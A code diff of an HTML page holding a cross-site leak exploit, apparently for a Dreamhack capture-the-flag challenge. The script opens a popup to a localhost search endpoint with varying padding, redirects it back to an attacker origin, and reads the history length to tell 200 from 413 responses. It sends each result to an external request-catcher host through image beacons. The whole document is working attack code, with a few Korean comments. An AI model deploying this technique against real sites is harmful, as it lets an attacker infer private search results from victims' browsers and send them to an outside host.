@@ -1,18 +1,20 @@
 <!doctype html><meta charset="utf-8"><body><script>
-const T="http://localhost",C="https://qpyxgdm.request.dreamhack.games";
+const T="http://localhost",C="https://zncvrtk.request.dreamhack.games";
 const SELF="https://niu0102.github.io/aaaa.html?blank=1";
 const L=(t,d)=>new Image().src=C+"/"+t+"?d="+encodeURIComponent(JSON.stringify(d))+"&t="+Date.now();
 const F=(p,pad)=>`${T}/find.php?search=${encodeURIComponent(p)}&w=${"A".repeat(pad)}&h=`;
 function P(u){return new Promise(r=>{
   const w=open("about:blank","p","width=150,height=150");
-  setTimeout(()=>{try{w.location=u}catch(e){}},50);       // localhost로
-  setTimeout(()=>{try{w.location=SELF}catch(e){}},1400);  // 내 오리진으로 되돌림
+  setTimeout(()=>{try{w.location=u}catch(e){}},50);
+  setTimeout(()=>{try{w.location=SELF}catch(e){}},2000);
   setTimeout(()=>{let h;try{h=w.history.length}catch(e){h="E:"+e.name}
-    try{w.close()}catch(e){}r(h)},2400);                  // 되돌린 뒤 읽기
+    try{w.close()}catch(e){}r(h)},3200);
 });}
 (async()=>{
-  if(location.search.includes("blank"))return;            // 되돌아온 창은 아무것도 안 함
-  for(const pad of [100,3000]){L("c",{pad,hlen:await P(F("zzz",pad))});await new Promise(r=>setTimeout(r,500))}
+  if(location.search.includes("blank"))return;
+  L("c",{pad:10,hlen:await P(F("zzz",10))});        // 확실한 200
+  await new Promise(r=>setTimeout(r,600));
+  L("c",{pad:3000,hlen:await P(F("zzz",3000))});    // 확실한 413
   L("done",{});
 })();
 </script>`
